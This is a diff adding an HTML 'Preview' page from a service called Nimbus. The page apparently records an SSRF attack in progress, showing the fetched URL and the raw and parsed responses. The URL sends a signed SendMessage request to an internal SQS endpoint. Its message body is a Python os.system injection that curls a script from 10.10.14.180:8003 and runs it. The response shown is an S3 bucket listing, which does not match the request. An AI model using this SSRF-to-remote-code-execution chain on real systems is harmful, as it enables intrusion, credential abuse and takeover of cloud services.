@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta charset="UTF-8"><title>Preview — Nimbus</title>
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { font-family: ui-monospace, Menlo, monospace; background: #1a1a1a; color: #d0d0d0; line-height: 1.5; padding: 2rem; max-width: 720px; margin: 0 auto; }
+h1 { font-size: 1.4rem; margin-bottom: 0.25rem; color: #e6db74; }
+.tag { color: #8b949e; font-size: 0.875rem; margin-bottom: 2rem; }
+nav { border-top: 1px solid #333; border-bottom: 1px solid #333; padding: 0.75rem 0; margin-bottom: 2rem; }
+nav a { color: #66d9ef; text-decoration: none; margin-right: 2rem; }
+.panel { border: 1px solid #333; padding: 1rem; margin-bottom: 1rem; }
+.err { border-left: 3px solid #f92672; padding-left: 1rem; color: #f92672; }
+.ok { border-left: 3px solid #a6e22e; padding-left: 1rem; color: #a6e22e; margin-bottom: 1rem; padding: 0.5rem 1rem; font-size: 0.875rem; }
+.meta { color: #666; font-size: 0.75rem; margin-bottom: 0.75rem; }
+pre { background: #0d0d0d; padding: 0.75rem; overflow-x: auto; max-height: 400px; font-size: 0.8rem; color: #c0c0c0; border: 1px solid #222; }
+h3 { font-size: 0.95rem; color: #a6e22e; margin: 1rem 0 0.5rem; }
+a { color: #66d9ef; }
+</style>
+</head>
+<body>
+<h1>Preview</h1>
+<div class="tag"><a href="/jobs">← submit another</a></div>
+<div class="panel">
+<div class="meta">Fetched: <code>http://172.18.0.2:4566/?Action=SendMessage&amp;Version=2012-11-05&amp;QueueUrl=http://172.18.0.2:4566/<REDACTED_ACCOUNT_ID>/nimbus-jobs&amp;MessageBody=script: &#39;__import__(&#34;os&#34;).system(&#34;curl 10.10.14.180:8003/r.sh -o /tmp/r5.sh; sh /tmp/r5.sh&#34;)&#39;&amp;X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=<REDACTED_ACCESS_KEY_ID>/20260907/us-east-1/sqs/aws4_request&amp;X-Amz-Date=20260907T092725Z&amp;X-Amz-Expires=300&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Security-Token=<REDACTED_SESSION_TOKEN>&amp;X-Amz-Signature=6ede6a0c03b1947c079c87725c722fff0958558c71db26770ee91c74a21fb730&amp;x=.yaml</code> · HTTP 200</div>
+<h3>Raw response</h3><pre>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;&lt;ListAllMyBucketsResult xmlns=&#34;http://s3.amazonaws.com/doc/2006-03-01/&#34;&gt;&lt;Owner&gt;&lt;ID&gt;owner&lt;/ID&gt;&lt;DisplayName&gt;owner&lt;/DisplayName&gt;&lt;/Owner&gt;&lt;Buckets&gt;&lt;Bucket&gt;&lt;Name&gt;nimbus-dev-artifacts&lt;/Name&gt;&lt;CreationDate&gt;2026-09-06T08:22:42.262728821Z&lt;/CreationDate&gt;&lt;/Bucket&gt;&lt;/Buckets&gt;&lt;/ListAllMyBucketsResult&gt;</pre>
+<h3>Parsed</h3><pre>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;&lt;ListAllMyBucketsResult xmlns=&#34;http://s3.amazonaws.com/doc/2006-03-01/&#34;&gt;&lt;Owner&gt;&lt;ID&gt;owner&lt;/ID&gt;&lt;DisplayName&gt;owner&lt;/DisplayName&gt;&lt;/Owner&gt;&lt;Buckets&gt;&lt;Bucket&gt;&lt;Name&gt;nimbus-dev-artifacts&lt;/Name&gt;&lt;CreationDate&gt;2026-09-06T08:22:42.262728821Z&lt;/CreationDate&gt;&lt;/Bucket&gt;&lt;/Buckets&gt;&lt;/ListAllMyBucketsResult&gt;</pre>
+</div>
+
+</body>
+</html>
